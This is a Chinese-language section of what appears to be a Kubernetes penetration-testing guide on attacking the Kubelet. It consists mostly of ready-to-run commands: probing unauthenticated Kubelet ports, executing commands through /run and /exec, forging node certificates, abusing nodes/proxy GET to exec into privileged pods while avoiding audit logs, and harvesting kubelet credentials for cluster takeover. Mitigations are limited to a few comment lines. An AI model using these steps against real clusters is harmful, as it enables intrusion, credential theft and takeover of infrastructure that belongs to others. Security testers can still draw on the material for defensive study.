## 七、Kubelet 攻击面与 nodes/proxy 深度利用

### 7.1 Kubelet 未认证/弱认证（10250/10255）

```bash
# 未认证探测（10250 是 HTTPS 认证端口，10255 是只读端口）
curl -sk https://node:10250/pods | head -50
curl -sk https://node:10250/metrics | head -5

# 10255 只读端口泄露容器列表/镜像
curl -s http://node:10255/pods

# kubelet /run 未认证执行（老版本/错误配置）
curl -sk -X POST https://node:10250/run/<ns>/<pod>/<container> -d "cmd=id"

# kubelet /exec（需要认证，认证方式见 7.3）
# WebSocket exec：curl -sk "https://node:10250/exec/<ns>/<pod>/<container>?command=id&stdin=1&stdout=1&stderr=1&tty=1" \
#   -H "Authorization: Bearer <token-or-client-cert>" --output - 

# 常见弱认证：kubelet 仅验证客户端证书存在（不校验 CA），
# 生成任意自签名证书 + CN=system:node:<任意节点名> 即可认证
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=system:node:fake-node/O=system:nodes"
curl -sk --cert cert.pem --key key.pem https://node:10250/pods
```

### 7.2 nodes/proxy GET → 集群 RCE（2026 高危设计缺陷）

**原理**：`nodes/proxy` 是控制 Kubelet 全部端点的 catch-all 权限。监控组件（prometheus/grafana/promtail/datadog/cilium-spire 等 69 个 Helm Chart）普遍持有 `nodes/proxy GET`。而 Kubelet `/exec` 的授权检查只验证 WebSocket **握手时的 GET 请求**（RFC 6455 强制 GET），升级成功后**不再做 CREATE 检查** → 拥有 GET 权限即可在任意 Pod 执行命令（含 kube-system 特权系统 Pod）：

```bash
# 攻击前置检查：当前身份是否拥有 nodes/proxy
kubectl auth can-i get nodes/proxy --all-namespaces   # true = 可利用

# 利用链：
# 1. 枚举可达节点的 Pod（kubelet /pods）
curl -sk https://<node>:10250/pods -H "Authorization: Bearer $TOKEN" | jq -r '.items[].metadata.name'

# 2. 通过 API Server 代理或直连 kubelet 发起 WebSocket exec
#    (API Server 代理路径: /api/v1/nodes/<node>/proxy/exec/<ns>/<pod>/<container>)
# 3. 目标：kube-proxy / cilium-agent 等特权 Pod → root → 逃逸节点
# 4. 注意：该路径不记录审计日志（仅 subjectaccessreviews），比 pods/exec 更隐蔽

# 官方定性：Won't Fix（working as intended）
# 缓解：K8s v1.36+ KubeletFineGrainedAuthz（nodes/metrics、nodes/stats 等细粒度子资源，KEP-2862）；
#       最小化 nodes/proxy 授权；无法避免时用 ServiceAccount 监控 + 网络层限制 10250 可达性
```

### 7.3 Kubelet 凭据收割（节点逃逸后必做）

```bash
# 逃逸到节点后（见 4.4）：
# kubelet 客户端证书 = 节点身份，可认证 API Server
cat /var/lib/kubelet/pki/kubelet-client-current.pem      # 私钥+证书合一

# 构造 kubeconfig
kubectl --server=https://<apiserver>:6443 \
  --client-certificate=/var/lib/kubelet/pki/kubelet-client-current.pem \
  --client-key=/var/lib/kubelet/pki/kubelet-client-current.pem \
  --insecure-skip-tls-verify get pods -A

# 节点身份权限：通常可读写本节点 pods、获取节点上所有 Pod 的 SA Token 引用
# 进一步：创建特权 Pod 绑定到本节点（nodeName 指定）→ 偷其他 SA Token → 集群接管
```

